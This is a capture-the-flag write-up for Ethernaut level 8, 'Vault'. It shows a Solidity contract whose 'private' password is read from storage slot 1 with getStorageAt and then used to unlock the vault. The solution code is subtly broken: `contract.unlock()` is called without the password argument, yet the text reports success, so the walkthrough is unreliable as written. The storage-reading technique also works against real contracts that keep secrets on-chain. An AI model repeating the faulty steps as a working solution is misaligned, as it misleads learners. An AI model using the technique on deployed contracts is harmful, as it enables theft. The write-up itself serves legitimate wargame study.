# Level 8: Vault

This is the level 8 of [Ethernaut](https://ethernaut.openzeppelin.com/) game.

## Pre-requisites
- [Layout of state variables](https://docs.soliditylang.org/en/v0.8.10/internals/layout_in_storage.html) in Solidity
- [Reading storage](https://web3js.readthedocs.io/en/v1.5.2/web3-eth.html#getstorageat) at a slot in contract

## Hack

Given contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Vault {
  bool public locked;
  bytes32 private password;

  constructor(bytes32 _password) public {
    locked = true;
    password = _password;
  }

  function unlock(bytes32 _password) public {
    if (password == _password) {
      locked = false;
    }
  }
}
```

`player` has to set `locked` to false.

Only way is by calling `unlock` by correct password.

Although `password` state variable is private, one can still read a storage variable by determining it's storage slot. Therefore sensitive information should not be stored on-chain, even if it is specified `private`.

Above, the `password` is at a storage slot of 1 in `Vault`.

Let's read it:

```javascript
password = await web3.eth.getStorageAt(contract.address, 1)
```

Call `unlock` with `password`:

```javascript
await contract.unlock()
```

Unlocked. Verify by:

```javascript
await contract.locked() === false
```

And that's it.